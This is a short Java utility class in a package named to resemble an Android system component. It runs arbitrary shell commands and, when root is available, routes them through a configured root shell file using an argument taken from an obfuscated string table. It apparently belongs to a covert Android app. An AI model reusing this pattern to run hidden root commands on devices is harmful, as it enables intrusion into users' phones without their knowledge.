package com.android.networking.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.Configuration;

public class Execute {
	private static final String TAG = "Execute";

	public static ExecuteResult executeRoot(String command) {
		if (Status.self().haveRoot()) {
			String cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35.0"), command); // EXPORT
			return execute(cmd);
		} else {
			return execute(command);
		}
	}

	public static ExecuteResult execute(String cmd) {
		String line = null;
		// ArrayList<String> fullResponse = new ArrayList<String>();
		Process localProcess = null;
		ExecuteResult result = new ExecuteResult();

		try {
			localProcess = Runtime.getRuntime().exec(cmd);
		} catch (Exception e) {
			if (Cfg.EXP) {
				Check.log(e);
			}
		}

		if (localProcess != null) {

			try {
				// BufferedWriter out = new BufferedWriter(new
				// OutputStreamWriter(localProcess.getOutputStream()));
				BufferedReader in = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));

				while ((line = in.readLine()) != null) {
					result.stdout.add(line);
				}

				in.close();
				result.exitCode = localProcess.waitFor();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		return result;
	}
}